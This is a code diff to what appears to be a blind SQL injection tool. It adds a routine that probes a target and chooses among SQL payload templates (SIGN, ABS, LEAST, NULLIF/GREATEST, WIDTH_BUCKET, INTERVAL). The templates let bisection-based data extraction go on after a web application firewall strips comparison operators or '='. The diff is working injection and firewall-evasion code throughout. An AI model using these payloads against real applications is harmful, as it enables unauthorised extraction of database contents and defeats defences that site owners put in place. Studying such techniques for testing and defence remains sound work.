@@ -429,17 +429,36 @@ class _Discovery(object):
             elif self._ask("2 BETWEEN 2 AND 3") and not self._ask("5 BETWEEN 2 AND 3"):
                 self._comparator = "between"
                 self.dialect.notes.append("'>' unusable; bisecting via BETWEEN")
-            elif self._ask("SIGN(2-1)=1") and not self._ask("SIGN(2-3)=1") and not self._ask("SIGN(2-2)=1"):
-                # ordered, log2-efficient, yet needs NO comparison operator (only SIGN(), '-', '=') -
-                # survives a WAF stripping '>' AND '<' AND BETWEEN, without dropping to slow membership
-                self._comparator = "sign"
-                self.dialect.notes.append("'>'/BETWEEN unusable; bisecting via SIGN() (no comparison operator)")
+            elif self._discoverOperatorFreeComparator():
+                # picked an ordered (log2) comparator that needs NO comparison operator - see below
+                pass
             else:
                 self._comparator = "membership"
                 self.dialect.notes.append("no ordered comparator; using order-free IN() subset bisection")
             self._inOk = self._ask("2 IN (2,3)") and not self._ask("9 IN (2,3)")
         except OracleUndecided:
             pass    # keep the safe defaults (gt / IN-ok)
+
+    def _discoverOperatorFreeComparator(self):
+        # Manual-derived ways to express "expr > n" using NO comparison operator (>,<,>=,<=,BETWEEN):
+        # each is an ORDERED (log2) test, so efficient bisection survives a WAF that strips the
+        # comparison operators instead of dropping to slow order-free membership. Ordered universal-
+        # first; each self-selects by a 3-point probe (2>1 true, 2>3/2>2 false). {expr}/{n} filled at use.
+        candidates = (
+            ("sign",        "SIGN(({expr})-({n}))=1"),                             # SIGN(): every major DBMS
+            ("abs",         "ABS(({expr})-({n})-1)=({expr})-({n})-1"),             # ABS(): backup if SIGN is name-filtered
+            ("least",       "LEAST(({expr}),({n})+1)=({n})+1"),                    # GREATEST/LEAST family (expr once)
+            ("nullif",      "NULLIF(GREATEST(({expr}),({n})),({n})) IS NOT NULL"), # needs NO '=' -> survives '=' filtering
+            ("widthbucket", "WIDTH_BUCKET(({expr}),0,({n})+1,1)=2"),               # PostgreSQL / Oracle
+            ("interval",    "INTERVAL(({expr}),({n})+1)=1"),                       # MySQL / MariaDB
+        )
+        for name, tmpl in candidates:
+            if self._ask(tmpl.format(expr=2, n=1)) and not self._ask(tmpl.format(expr=2, n=3)) and not self._ask(tmpl.format(expr=2, n=2)):
+                self._comparator = name
+                self._cmpTemplate = tmpl
+                self.dialect.notes.append("'>'/BETWEEN unusable; ordered bisection via %s() (no comparison operator)" % name.upper())
+                return True
+        return False
 
     def _charcodeSemantics(self, tmpl):
         # ASCII-only ROUND-TRIP: build a char from its code, then read the code back.
